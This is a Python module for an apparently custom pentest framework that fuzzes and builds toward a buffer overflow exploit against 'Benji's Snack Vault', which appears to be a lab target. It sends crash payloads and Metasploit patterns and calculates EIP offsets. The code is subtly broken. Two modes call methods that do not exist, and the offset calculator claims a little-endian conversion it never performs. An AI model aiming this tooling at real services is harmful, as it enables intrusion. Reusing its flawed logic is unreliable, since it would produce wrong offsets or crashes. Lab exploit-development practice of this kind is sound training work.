# modules/buffer_overflow/benjis_snack_vault_fuzz.py
import socket
import time
import sys
import subprocess
from base_module import BaseModule
from utils import colored

class BenjisSnackVaultFuzz(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "benjis_snack_vault_fuzz"
        self.description = "Fuzzer, pattern sender, badchar tester, and offset calculator for Benji's Snack Vault buffer overflow"

        self.options = {
            "RHOST": {"value": "192.168.107.132", "required": True, "description": "Target IP"},
            "RPORT": {"value": 9999, "required": True, "description": "Target port"},
            "PREFIX": {"value": "MEOW ", "required": True, "description": "Command prefix (e.g., MEOW )"},
            "MODE": {"value": "fuzz", "required": True, "description": "Mode: fuzz | pattern | badchars | test_offset | offset_calc"},
            "PATTERN_LENGTH": {"value": 3000, "required": False, "description": "Length for pattern mode (auto-used in offset_calc if not set)"},
            "OFFSET": {"value": 0, "required": False, "description": "Offset to EIP (set after pattern/offset_calc)"},
            "CRLF": {"value": True, "required": False, "description": "Append \\r\\n to payloads (yes/no)"}
        }

        # Remember last pattern for offset_calc
        self.last_pattern_length = 0

    def show_help(self):
        print(colored("\nBenji's Snack Vault Fuzzer Help:", "yellow"))
        print("Modes:")
        print("  fuzz          - Incremental A's to find crash point")
        print("  pattern       - Send unique pattern for offset discovery")
        print("  badchars      - Send 01-ff bytes after offset to find bad chars")
        print("  test_offset   - Test EIP overwrite with BBBB at set offset")
        print("  offset_calc   - Calculate offset from EIP value (no Metasploit needed)")
        print("\nTypical workflow:")
        print("  set MODE fuzz → run → note crash size")
        print("  set PATTERN_LENGTH <crash+500> → set MODE pattern → run → note EIP")
        print("  set MODE offset_calc → run → enter EIP → get offset")
        print("  set OFFSET <result> → set MODE badchars → run → inspect dump")
        print("  set MODE test_offset → run → confirm EIP = 42424242\n")

    def run(self):
        opts = {k: v["value"] for k, v in self.options.items()}
        rhost = opts["RHOST"]
        rport = int(opts["RPORT"])
        prefix = opts["PREFIX"]
        mode = opts["MODE"].lower()
        crlf = opts["CRLF"]

        if mode == "fuzz":
            self._run_fuzz(rhost, rport, prefix, crlf)
        elif mode == "pattern":
            self._run_pattern(rhost, rport, prefix, int(opts["PATTERN_LENGTH"]), crlf)
        elif mode == "badchars":
            if opts["OFFSET"] == 0:
                print(colored("[-] Set OFFSET first (from pattern/offset_calc)", "red"))
                return
            self._run_badchars(rhost, rport, prefix, int(opts["OFFSET"]), crlf)
        elif mode == "test_offset":
            if opts["OFFSET"] == 0:
                print(colored("[-] Set OFFSET first", "red"))
                return
            self._test_offset(rhost, rport, prefix, int(opts["OFFSET"]), crlf)
        elif mode == "offset_calc":
            self._run_offset_calc(opts)
        else:
            print(colored(f"[-] Unknown mode: {mode}", "red"))
            print(colored("Valid: fuzz, pattern, badchars, test_offset, offset_calc", "yellow"))

    def _send_payload(self, rhost, rport, payload):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((rhost, rport))
            s.send(payload)
            s.close()
            return True
        except Exception as e:
            print(colored(f"[!] Connection failed: {e}", "red"))
            return False

    def _run_fuzz(self, rhost, rport, prefix, crlf):
        print(colored("[*] Fuzz mode - sending increasing A's", "yellow"))
        for size in range(100, 6000, 200):
            junk = b"A" * size
            payload = prefix.encode() + junk
            if crlf:
                payload += b"\r\n"
            print(f"  [+] Sending {len(payload)} bytes...", end="", flush=True)
            if self._send_payload(rhost, rport, payload):
                print(" OK")
            else:
                print(colored(" CRASH/REFUSED!", "red"))
                print(colored(f"[!] Potential crash around {size} junk bytes", "green"))
                break
            time.sleep(0.2)

    def _run_pattern(self, rhost, rport, prefix, length, crlf):
        print(colored(f"[*] Pattern mode - generating {length}-byte pattern using Metasploit", "yellow"))
        try:
            # Generate with real Metasploit tool
            pattern_output = subprocess.check_output(
                ["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb", "-l", str(length)],
                text=True
            ).strip()
            pattern = pattern_output.encode()
        except Exception as e:
            print(colored(f"[-] Failed to run pattern_create.rb: {e}", "red"))
            print(colored("    Ensure Metasploit is installed and path is correct", "yellow"))
            return

        payload = prefix.encode() + pattern
        if crlf:
            payload += b"\r\n"

        if self._send_payload(rhost, rport, payload):
            print(colored("[+] Pattern sent successfully", "green"))
            print(colored(f"    Crash in Immunity → note EIP value", "yellow"))
            print(colored(f"    IMPORTANT: Use length {length} for offset calculation", "red"))
            self.last_pattern_length = length
        else:
            print(colored("[!] Send failed - check target connection", "red"))

    def _run_offset_calc(self, opts):
        pattern_length = int(opts["PATTERN_LENGTH"])
        if pattern_length == 0 and hasattr(self, 'last_pattern_length') and self.last_pattern_length > 0:
            pattern_length = self.last_pattern_length
            print(colored(f"[*] Using last pattern length from previous pattern run: {pattern_length}", "yellow"))

        if pattern_length == 0:
            print(colored("[-] No pattern length set. Run 'pattern' mode first or set PATTERN_LENGTH", "red"))
            return

        eip_hex = input(colored("Enter EIP value from Immunity (8 hex digits, e.g. 60336643): ", "yellow")).strip().upper()
        if not eip_hex or len(eip_hex) != 8:
            print(colored("[-] Invalid EIP - must be exactly 8 hex digits (no 0x, no spaces)", "red"))
            return

        offset = self._calc_offset(eip_hex, pattern_length)
        if offset is not None:
            print(colored(f"[+] Exact match at offset {offset}", "green"))
            print(colored(f"    Use this in exploit module: set OFFSET {offset}", "yellow"))
            # Auto-update the OFFSET option for convenience
            self.options["OFFSET"]["value"] = offset

    def _calc_offset(self, eip_hex, pattern_length):
        """Replaces pattern_offset.rb - calculates offset using real Metasploit pattern"""
        try:
            # Convert EIP hex to little-endian bytes (stack order)
            eip_bytes = bytes.fromhex(eip_hex)
            if len(eip_bytes) != 4:
                print(colored("[-] EIP must be 8 hex digits (4 bytes)", "red"))
                return None

            # Generate the EXACT same pattern Metasploit uses
            pattern_output = subprocess.check_output(
                ["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb", "-l", str(pattern_length)],
                text=True
            ).strip()
            pattern = pattern_output.encode()

            offset = pattern.find(eip_bytes)
            if offset == -1:
                print(colored("[-] EIP not found in pattern", "red"))
                print(colored("    Double-check:", "yellow"))
                print(colored("    - EIP copied correctly (8 hex digits, no spaces)", "yellow"))
                print(colored("    - PATTERN_LENGTH matches the one used to send pattern", "yellow"))
                print(colored("    - Crash was from this exact pattern send", "yellow"))
                return None

            print(colored(f"[+] Exact match at offset {offset}", "green"))
            return offset

        except Exception as e:
            print(colored(f"[-] Offset calculation failed: {e}", "red"))
            print(colored("    Ensure Metasploit is installed and pattern_create.rb is in /usr/share/metasploit-framework/tools/exploit/", "yellow"))
            return None
        
    def handle_command(self, cmd):
        cmd_lower = cmd.strip().lower()
        if cmd_lower == "run":
            self.run()
            return
        if cmd_lower == "help":
            self.show_help()
            return
        super().handle_command(cmd)